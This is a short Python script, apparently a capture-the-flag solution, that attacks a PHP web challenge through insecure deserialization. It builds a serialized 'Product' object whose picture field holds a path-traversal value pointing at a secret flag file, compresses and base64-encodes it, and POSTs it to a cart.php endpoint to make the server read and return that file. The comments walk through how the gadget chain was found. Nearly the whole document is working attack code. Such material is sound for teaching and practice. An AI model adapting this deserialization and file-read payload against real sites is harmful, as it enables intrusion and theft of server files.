import base64
import zlib
import IPython
import requests

#state = "eJxlj0kKwzAMRXMWn8BzbPkQXfQARbVlMGSAOKuW3L1xOhDoQov/eBL6FzDAriuuxEDCs4LQwLoDdJVqLfPEwgX6XfokUIcmmvZGXUksVLD7ZiT0iXOfFHmpSHvvrJS9M3ckq51NSvVZGJdJCS5NzDlzjR65U5QIdbsj1On0hCM16IA9aJkjDrFFKU8OjViGG6a07OBP3r7PHp0iLisL2LoW4KGA+M22vQCc7lAm"
#a = base64.b64decode(state)

#b = zlib.decompress(a)

#print(b)## this is the state, so we can put anything inside

## we need another class so that we are able to print out the filesystem

## go to Product.inc.php->getPicture()
### it reads from the filesystem from a variable of the class ( $this->picture)
### then the toDict() function calls getPicture()
### I need to print out the output of toDict

## So I'll look for all the invokations of toDict()
## and I'll find out that products.php, cart.php , State.inc.php and Product.inc.php call this function

### the cart looks more promising!!

### instead of a state we feed the cart invokation a Product !!

o = b"""O:7:"Product":5:{s:11:"\x00Product\x00id";i:0;s:13:"\x00Product\x00name";s:6:"asdasd";s:20:"\x00Product\x00description";s:6:"asdasd";s:16:"\x00Product\x00picture";s:27:"../../../../secret/flag.txt";s:14:"\x00Product\x00price";i:0;}"""
obj = base64.b64encode(zlib.compress(o))
print(obj)
r = requests.post("http://jinblack.it:3006/api/cart.php",  data= {'state': obj})
## with a "get" I get a 400, here I get a 500
##on embed type r.text to get it
IPython.embed()
